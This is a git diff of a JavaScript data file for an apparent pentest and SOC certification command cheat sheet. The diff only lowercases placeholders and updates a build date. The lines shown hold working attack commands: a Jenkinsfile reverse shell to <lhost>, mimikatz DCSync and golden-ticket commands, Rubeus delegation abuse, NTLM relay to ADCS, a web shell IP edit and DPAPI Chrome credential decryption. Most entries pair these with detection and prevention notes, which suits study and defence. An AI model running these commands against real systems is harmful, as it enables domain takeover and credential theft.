@@ -99,7 +99,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-gpo-permissions",
       "name": "Abusing GPO Permissions — Attack, Detection & Honeypot",
-      "command": "Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -ne '<DOMAIN_CONTROLLERS_SID>' }",
+      "command": "Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -ne '<domain_controllers_sid>' }",
       "description": "Group Policy Objects can be weaponized if non-admin accounts have modification rights. An attacker with GPO write access can push malicious configurations (scheduled tasks, registry keys, immediate tasks) to all computers in the linked OU — including DCs. Detection: Event 5136 (DS Object Modified) for GPO container in AD. Honeypot: monitor 5136 on decoy GPO and immediately disable the modifying account.",
       "platform": "windows",
       "type": "attack-chain",
@@ -3993,7 +3993,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "WSPCoerce (via Loader, in-memory)",
-          "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <TARGET_DC> <LISTENER_HOST>"
+          "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <target_dc> <listener_host>"
         }
       ],
       "steps": [
@@ -5015,7 +5015,7 @@ const COMMAND_DATA = {
     {
       "id": "aws-jenkins-pipeline-rce",
       "name": "AWS - Jenkins Pipeline Modification for RCE & Credential Theft",
-      "command": "# In Jenkinsfile - inject reverse shell into pipeline stage:\nstage('Deploy') {\n  steps {\n    withAWS(region: 'us-east-1', credentials: 'aws_key') {\n      sh 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &'\n    }\n  }\n}",
+      "command": "# In Jenkinsfile - inject reverse shell into pipeline stage:\nstage('Deploy') {\n  steps {\n    withAWS(region: 'us-east-1', credentials: 'aws_key') {\n      sh 'bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\" &'\n    }\n  }\n}",
       "description": "Jenkins pipelines that have write access to their Jenkinsfile (in SCM or directly) can be modified to inject arbitrary shell commands. The withAWS() pipeline step injects IAM credentials as environment variables — running a reverse shell inside this block leaks those credentials. The shell spawns as the jenkins user running in a Docker container (for cloud-based Jenkins). After getting shell, 'env | grep AWS' dumps the injected AWS access key ID and secret from the process environment.",
       "type": "command",
       "platform": "linux",
@@ -12936,7 +12936,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-credentials-in-shares",
       "name": "Credentials in Network Shares — Discovery & Detection",
-      "command": "Invoke-ShareFinder -domain <DOMAIN> -ExcludeStandard -CheckShareAccess",
+      "command": "Invoke-ShareFinder -domain <domain> -ExcludeStandard -CheckShareAccess",
       "description": "Credentials frequently exposed in network share scripts (.ps1, .bat, .cmd, .ini, .config) accessible to all domain users. Common in environments where admins leave credential-bearing scripts in shares open to 'Everyone' or 'Domain Users'. Detection: monitor for bulk SMB connections (one-to-many from workstation), logon events from unexpected sources.",
       "platform": "windows",
       "type": "attack-chain",
@@ -13809,7 +13809,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-dcsync",
       "name": "DCSync Attack — Attack, Detection & Defense",
-      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator",
+      "command": "mimikatz # lsadump::dcsync /domain:<domain> /user:Administrator",
       "description": "DCSync impersonates a Domain Controller to request password hash replication from a real DC. Requires 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights. Detection: Event 4662 with specific AD replication GUIDs originating from a non-DC account. Prevention: RPC Firewall to restrict replication to DC-only sources.",
       "platform": "windows",
       "type": "attack-chain",
@@ -30992,7 +30992,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m11-js-obfuscation",
       "name": "JavaScript Obfuscation & Deobfuscation — Techniques and Tools",
-      "command": "curl -s http://<TARGET_IP>:<PORT>/secret.js",
+      "command": "curl -s http://<target_ip>:<port>/secret.js",
       "description": "JavaScript obfuscation techniques and deobfuscation workflow. Obfuscation types: (1) Minification — single long line (.min.js), (2) Packing — eval(function(p,a,c,k,e,d){...}) pattern, recognizable by 6-arg function, (3) Advanced — obfuscator.io with Base64 string arrays, (4) JSFuck/JJEncode/AAEncode — bracket-only or Unicode encoding. Deobfuscation: Browser DevTools Pretty Print ({}), Beautifier.io, Prettier.io, UnPacker (matthewfl.com). Packed code: find return value, replace eval with console.log. Source discovery: Ctrl+U (view-source), CTRL+SHIFT+Z (Firefox debugger), check <script src='...'> tags.",
       "platform": "linux",
       "type": "cheatsheet",
@@ -32294,7 +32294,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-constrained-delegation",
       "name": "Kerberos Constrained Delegation Abuse (S4U)",
-      "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt",
+      "command": ".\\Rubeus.exe s4u /user:<delegate_user> /rc4:<ntlm_hash> /domain:<domain> /impersonateuser:Administrator /msdsspn:\"http/<dc_hostname>\" /dc:<dc_fqdn> /ptt",
       "description": "Kerberos Constrained Delegation allows a service account to request tickets on behalf of any user to specific services. Attackers with control of a delegated account can impersonate Domain Admins to those services (e.g., HTTP→WinRM→DC). Detection: Event 4624 with 'Transited Services' attribute showing S4U delegation chain. Prevention: mark privileged users as 'Account is sensitive and cannot be delegated', add to Protected Users group.",
       "platform": "windows",
       "type": "attack-chain",
@@ -32398,7 +32398,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-golden-ticket",
       "name": "Kerberos Golden Ticket — Forged TGT Attack",
-      "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt",
+      "command": "mimikatz # kerberos::golden /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_ntlm> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt",
       "description": "Golden Ticket forges a valid Kerberos TGT signed with the krbtgt account's NTLM hash. Any user possessing krbtgt's hash can create tickets for any account with any privileges, valid for the configured lifetime. Requires DCSync (or NTDS.dit) to obtain krbtgt hash. Detection: Event 4624 from unexpected IPs, TGS tickets without prior TGT on DC, SIDHistory filtering triggers Event 4675.",
       "platform": "windows",
       "type": "attack-chain",
@@ -33128,7 +33128,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-kibana-visualizations",
       "name": "Kibana - Building SOC Dashboards & Visualizations",
-      "command": "http://<TARGET_IP>:5601 → Dashboard → Create visualization",
+      "command": "http://<target_ip>:5601 → Dashboard → Create visualization",
       "description": "Step-by-step workflow for creating Kibana Lens visualizations and SOC dashboards from Windows event log data in Elastic SIEM.",
       "platform": "linux",
       "type": "reference",
@@ -33938,7 +33938,7 @@ const COMMAND_DATA = {
         },
         {
           "description": "Edit allowedIps to restrict shell access (mandatory before upload)",
-          "command": "# Edit demo.aspx — find 'allowedIps' near the top:\n# String[] allowedIps = { \"127.0.0.1\", \"::1\", \"<YOUR_ATTACKER_IP>\" };\n# Add your IP, remove ::1/127.0.0.1 if desired, save file",
+          "command": "# Edit demo.aspx — find 'allowedIps' near the top:\n# String[] allowedIps = { \"127.0.0.1\", \"::1\", \"<your_attacker_ip>\" };\n# Add your IP, remove ::1/127.0.0.1 if desired, save file",
           "label": "Edit demo.aspx — find 'allowedIps'…"
         },
         {
@@ -36613,7 +36613,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "kinit from keytab",
-          "command": "kinit <user>@<REALM> -k -t <keytab>"
+          "command": "kinit <user>@<realm> -k -t <keytab>"
         },
         {
           "label": "SMB with Kerberos",
@@ -42320,7 +42320,7 @@ const COMMAND_DATA = {
       "steps": [
         {
           "label": "Get the DPAPI masterkey",
-          "command": "dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\<SID>\\<guid>\" /sid:<SID> /password:<password>"
+          "command": "dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\<sid>\\<guid>\" /sid:<sid> /password:<password>"
         },
         {
           "label": "Decrypt Chrome logins",
@@ -45671,7 +45671,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "3. Open the web interface",
-          "command": "# https://localhost:8834  (or https://<IP>:8834)"
+          "command": "# https://localhost:8834  (or https://<ip>:8834)"
         }
       ],
       "opsec": "moderate",
@@ -52127,7 +52127,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-pki-esc8",
       "name": "PKI ESC8 — NTLM Relay to ADCS HTTP Enrollment",
-      "command": "impacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs",
+      "command": "impacket-ntlmrelayx -t http://<pki_ip>/certsrv/default.asp --template DomainController -smb2support --adcs",
       "description": "ESC8: Active Directory Certificate Services (ADCS) web enrollment is enabled and does not require HTTPS, making it vulnerable to NTLM relay. Combined with coercion (PrinterBug/Coercer), the DC's NTLM auth is relayed to the CA web interface, obtaining a DC certificate. The certificate is used to get a TGT as the DC account, enabling DCSync. Detection: Events 4886/4887 with template=DomainController but requester is the relay IP, not DC. Event 4768 with cert-based pre-authentication.",
       "platform": "linux",
       "type": "attack-chain",
@@ -55859,7 +55859,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m06-print-spooler-ntlm-relay",
       "name": "Print Spooler Bug + NTLM Relay (DCSync via PrinterBug)",
-      "command": "impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support",
+      "command": "impacket-ntlmrelayx -t dcsync://<dc2_ip> -smb2support",
       "description": "The PrinterBug (2018) forces any Windows machine with Print Spooler enabled to authenticate to an attacker-controlled machine. Combined with NTLMRelayx, relay the DC's credential to another DC to perform DCSync without 4662 events. Requires SMB Signing disabled on target DC. Detection: Event 4624 for DC$ account originating from unexpected IP.",
       "platform": "linux",
       "type": "attack-chain",
@@ -76293,7 +76293,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-m07-tcpdump-filters",
       "name": "TCPDump — BPF Packet Filters & TCP Flag Hunting",
-      "command": "sudo tcpdump -i eth0 host <TARGET_IP>",
+      "command": "sudo tcpdump -i eth0 host <target_ip>",
       "description": "TCPDump uses Berkeley Packet Filter (BPF) syntax to filter captures by host, network, port, protocol, packet size, and logical operators. Filters can be applied pre-capture (drop non-matching traffic) or post-capture when reading a PCAP (non-destructive). TCP flag inspection requires byte-offset syntax: tcp[13] accesses the flags byte.",
       "platform": "linux",
       "type": "cheatsheet",
@@ -76480,7 +76480,7 @@ const COMMAND_DATA = {
     {
       "id": "cdsa-thehive-platform",
       "name": "TheHive - Case Management Platform",
-      "command": "http://<TARGET_IP>:9000",
+      "command": "http://<target_ip>:9000",
       "description": "TheHive is the SOC's case management system. Used to triage alerts, create/manage incident cases, assign tasks, enrich IOCs via Cortex, and document investigation findings.",
       "platform": "linux",
       "type": "reference",
@@ -89985,7 +89985,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 905,
-  "buildDate": "2026-08-26T15:24:21.766Z",
+  "buildDate": "2026-08-26T15:39:44.028Z",
   "certifications": [
     "CDSA",
     "CPTS",
